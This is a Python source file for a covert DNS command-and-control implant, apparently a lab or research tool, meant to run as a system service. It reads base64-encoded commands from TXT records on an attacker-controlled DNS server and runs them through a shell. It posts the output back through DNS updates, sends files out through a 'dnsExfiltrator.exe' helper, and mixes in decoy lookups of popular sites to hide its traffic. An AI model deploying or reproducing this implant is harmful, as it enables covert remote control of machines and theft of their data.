# stored in /opt/covert_channel for system service to be executed
import dns.resolver
import dns.update
import base64
import subprocess
import time
import random

# seconds between polling server for more commands
POLL_TIME = 3

# will do this amount of normal and malicious DNS queries
# if set to -1, will just do malicious queries forever
QUERY_LIMIT = 10000


DOMAINS = [
    'google.com',
    'youtube.com',
    'example.net',
    'yahoo.com',
    'facebook.com',
    'linkedin.com',
    'netflix.com',
    'microsoft.com',
    'cloudflare.com',
    'github.com',
    'stackoverflow.com',
    'zoom.us',
    'bing.com',
    'pinterest.com',
    'duckduckgo.com',
    'adobe.com',
    'spotify.com',
    'salesforce.com',
    'protonmail.com',
    'cnn.com',
    'nytimes.com',
    'weather.com',
    'openai.com'
]

# Define server and domain
dns_server = "192.168.243.141"
domain = "c2.netres.com."
response_record = "response.c2.netres.com."
exfil_domain = "exfil.netres.com."
subdomains = ['command']

exfil_encrypt_password = 'password'


def update_response_record(msg: str):
    # for now, just shorten it
    msg = msg[:186]

    encoded_msg = base64.b64encode(msg.encode('utf-8')).decode('utf-8')

    update = dns.update.Update(domain)
    update.delete(response_record, 'TXT')

    # split into multiple if too long
    # if len(encoded_msg) > 255:
    #     chunks = [f'"{encoded_msg[i:i+255]}"' for i in range(0, len(encoded_msg), 255)]
    #     update.add(response_record, 60, 'TXT', *chunks)
    # else:
    #     update.add(response_record, 60, 'TXT', encoded_msg)

    update.add(response_record, 60, 'TXT', encoded_msg)

    response = dns.query.tcp(update, dns_server)
    return response


def decode_message(encoded_message):
    """
    Decode the Base64 encoded message.
    """
    print(encoded_message)
    try:
        return base64.b64decode(encoded_message).decode()
    except Exception as e:
        print(f"Error decoding message: {e}")
        return None


def execute_command(command):
    """
    Execute the decoded command on the server.
    """
    try:
        # if the command starts with 'exfiltrate', it is a special command
        # format of exfiltrate command should be
        #   exfiltrate [file]
        if command.startswith('exfiltrate'):
            args_list = command.split()
            command = f'.\\dnsExfiltrator.exe {args_list[1]} {exfil_domain} {exfil_encrypt_password} -b32 s={dns_server}'

        result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if result.returncode == 0:
            print(f"Command executed successfully:\n{result.stdout.strip()}")
            update_response_record(result.stdout.strip())
        else:
            print(f"Error executing command:\n{result.stderr}")
            update_response_record('ERROR')
    except Exception as e:
        print(f"Error while executing the command: {e}")


def get_covert_messages(resolver: dns.resolver.Resolver):
    """
    Query the DNS server for covert messages stored in TXT records and execute them.
    """
    commands = []

    for subdomain in subdomains:
        try:
            response = resolver.resolve(f"{subdomain}.{domain}", 'TXT')
            for txt_record in response:
                encoded_message = txt_record.to_text().strip('"')  # Remove quotes
                
                # if it is empty, there is no command for us to run right now
                if not encoded_message:
                    commands.append('')
                    continue

                decoded_message = decode_message(encoded_message)
                if decoded_message:
                    print(f"Decoded Message from {subdomain}: {decoded_message}")
                    commands.append(decoded_message)
        except dns.resolver.NoAnswer:
            print(f"No TXT record found for {subdomain}.")
        except dns.resolver.NXDOMAIN:
            print(f"The domain {subdomain}.{domain} does not exist.")
        except Exception as e:
            print(f"DNS Query Failed for {subdomain}: {e}")
        
        return commands


def process_c2_command(resolver: dns.resolver.Resolver):
    commands = get_covert_messages(resolver)

    # for right now, only really expecting there to be one
    for command in commands:
        if not command:
            continue
        execute_command(command)
    
    print(f'Sleeping for {POLL_TIME} seconds...')
    time.sleep(POLL_TIME)


def make_dns_request(resolver: dns.resolver.Resolver):
    domain = DOMAINS[random.randint(0, len(DOMAINS)-1)]
    resolver.resolve(domain, 'A')


def poll_server():
    resolver = dns.resolver.Resolver()
    resolver.nameservers = [dns_server]


    if QUERY_LIMIT == -1:  # just run normally
        while True:
            process_c2_command(resolver)
    else:
        action_list = [1] * QUERY_LIMIT + [0] * QUERY_LIMIT
        random.shuffle(action_list)

        for counter, action in enumerate(action_list):
            print(f'**{counter}/{QUERY_LIMIT*2}**')
            if action == 0:
                print('')
                make_dns_request(resolver)
            else:
                process_c2_command(resolver)


if __name__ == '__main__':
    poll_server()

